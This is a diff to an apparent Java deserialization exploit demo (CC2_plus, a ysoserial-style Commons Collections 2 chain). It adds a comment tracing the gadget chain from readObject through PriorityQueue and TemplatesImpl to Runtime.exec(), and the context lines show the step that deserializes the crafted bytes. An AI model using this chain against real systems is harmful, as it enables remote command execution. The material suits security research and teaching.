@@ -1,3 +1,20 @@
+package ysoserial.vulndemo;
+/**
+ * Gadget chain:
+ *      ObjectInputStream.readObject()
+ *          PriorityQueue.readObject()
+ *              PriorityQueue.heapify()
+ *                  PriorityQueue.siftDown()
+ * 				        PriorityQueue.siftDownUsingComparator()
+ * 				            TransformingComparator.compare()
+ * 				                InvokerTransformer.transform()
+ * 				                    Method.invoke()
+ * 				                        TemplatesImpl.newTransformer()
+ * 				                            TemplatesImpl.getTransletInstance()
+ * 				                                Runtime.exec()
+ *
+ */
+
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
@@ -54,5 +71,7 @@ public class CC2_plus {
         ObjectInputStream ois = new ObjectInputStream(bais);
         Object o = ois.readObject();
         baor.close();
+
+
     }
 }
